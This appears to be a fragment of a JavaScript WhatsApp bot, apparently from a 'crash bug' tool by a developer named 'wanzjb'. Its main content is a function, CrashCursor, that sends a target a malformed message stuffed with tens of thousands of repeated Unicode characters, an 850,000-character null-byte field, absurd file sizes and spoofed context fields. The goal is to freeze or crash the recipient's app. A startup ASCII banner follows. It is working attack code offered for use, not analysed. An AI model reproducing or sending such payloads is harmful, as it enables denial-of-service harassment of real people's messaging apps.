											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};

async function CrashCursor(sock, target) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(25000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 39567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                },
                contentText: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                footerText: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/testi_hwuwhw99",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              thumbnail: "",
              sourceUrl: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              sourceId: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: ` 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰     - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    participant: { jid: target},
  });
}

//~~~~~~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~\\

// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("⟐ Memulai sesi WhatsApp...");
    
    console.log("Sukses Connected");

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n
                          ⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⠤⢤⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠒⢋⣉⣀⣠⣄⣀⣈⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣯⠴⠚⠉⠉⠀⠀⠀⠀⣤⠏⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⡇⠁⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⠿⢛⠁⠁⣸⠀⠀⠀⠀⠀⣤⣾⠵⠚⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⡀⠀⣠⠀⡇⢧⠀⠀⢀⣠⡾⡇⠀⠀⠀⠀⠀⣠⣴⠿⠋⠁⠀⠀⠀⠀⠘⣿⠀⣀⡠⠞⠛⠁⠂⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⣻⡦⣞⡿⣷⠸⣄⣡⢾⡿⠁⠀⠀⠀⣀⣴⠟⠋⠁⠀⠀⠀⠀⠐⠠⡤⣾⣙⣶⡶⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡷⠰⣔⣾⣖⣾⡷⢿⣐⣀⣀⣤⢾⣋⠁⠀⠀⠀⣀⢀⣀⣀⣀⣀⠀⢀⢿⠑⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⡦⠴⠴⠤⠦⠤⠤⠤⠤⠤⠴⠶⢾⣽⣙⠒⢺⣿⣿⣿⣿⢾⠶⣧⡼⢏⠑⠚⠋⠉⠉⡉⡉⠉⠉⠹⠈⠁⠉⠀⠨⢾⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠂⠐⠀⠀⠀⠈⣇⡿⢯⢻⣟⣇⣷⣞⡛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣆⠀⠀⠀⠀⢠⡷⡛⣛⣼⣿⠟⠙⣧⠅⡄⠀⠀⠀⠀⠀⠀⠰⡆⠀⠀⠀⠀⢠⣾⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⢶⠏⠉⠀⠀⠀⠀⠀⠿⢠⣴⡟⡗⡾⡒⠖⠉⠏⠁⠀⠀⠀⠀⣀⢀⣠⣧⣀⣀⠀⠀⠀⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⣠⣷⢿⠋⠁⣿⡏⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⢭⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⢏⡵⠛⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠛⠀⠀⠀⠀⢿⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣼⠛⣲⡏⠁⠀⠀⠀⠀⠀⢀⣠⡾⠋⠉⠀⠀⠀⠀⠀⠀⢾⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡴⠟⠀⢰⡯⠄⠀⠀⠀⠀⣠⢴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡾⠁⠁⠀⠘⠧⠤⢤⣤⠶⠏⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⣇⠂⢀⣀⣀⠤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
    console.log(chalk.bold.white("⟐ 𝕲𝖚𝖆𝖗𝖉𝖎𝖆𝖓 𝖔𝖋 𝕬𝖓𝖌𝖊𝖑"));
    console.log(chalk.bold.white("DEVELOPER:") + chalk.bold.blue("wanzjb"));
    console.log(chalk.bold.white("VERSION:") + chalk.bold.blue("V\n\n"));
    console.log(chalk.black(chalk.bgGreen('Bot is Starting. . .')));
})();